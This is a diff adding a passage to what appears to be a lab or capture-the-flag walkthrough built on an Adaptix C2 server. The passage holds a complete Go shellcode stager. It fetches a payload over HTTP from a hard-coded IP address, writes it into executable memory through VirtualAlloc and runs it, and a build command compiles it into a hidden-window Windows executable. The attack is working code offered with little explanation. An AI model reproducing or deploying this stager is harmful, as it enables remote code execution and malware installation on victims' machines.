@@ -926,5 +926,79 @@ So ill setup my adaptix c2 server and connect to it in the client
 Ive generated some shellcode on adaptix, ill be using a staged payload
 
 ```python
+// +build windows
+			
+package main
+			
+import (
+	"io"
+	"net/http"
+	"syscall"
+	"unsafe"
+	)
+			
+var (
+	kernel32            = syscall.NewLazyDLL("kernel32.dll")
+	procVirtualAlloc    = kernel32.NewProc("VirtualAlloc")
+	)
+			
+const (
+	MEM_COMMIT             = 0x1000
+	MEM_RESERVE            = 0x2000
+	PAGE_EXECUTE_READWRITE = 0x40
+	)
+			
+func downloadShellcode(url string) ([]byte, error) {
+	resp, err := http.Get(url)
+	if err != nil {
+		return nil, err
+		}
+	defer resp.Body.Close()
+			
+	return io.ReadAll(resp.Body)
+	}
+			
+func executeShellcode(shellcode []byte) {
+	addr, _, err := procVirtualAlloc.Call(
+		0,
+		uintptr(len(shellcode)),
+		MEM_COMMIT|MEM_RESERVE,
+		PAGE_EXECUTE_READWRITE,
+	)
+	if addr == 0 {
+		panic(err)
+	}
+			
+	// Copy shellcode into allocated memory
+	for i := 0; i < len(shellcode); i++ {
+		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = shellcode[i]
+	}
+		
+	// Execute shellcode
+	syscall.Syscall(addr, 0, 0, 0, 0)
+}
+		
+
+func main() {
+	url := "http://10.200.88.158/http.x64.bin"
+			
+	shellcode, err := downloadShellcode(url)
+	if err != nil {
+		panic(err)
+	}
+			
+	executeShellcode(shellcode)
+}
+```
+
+This is the stager.go payload
+
+```python
+GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-H windowsgui" -o stager.exe stager.go
+```
+
+This compiled it into stager.exe
+
+```python
 
 ```
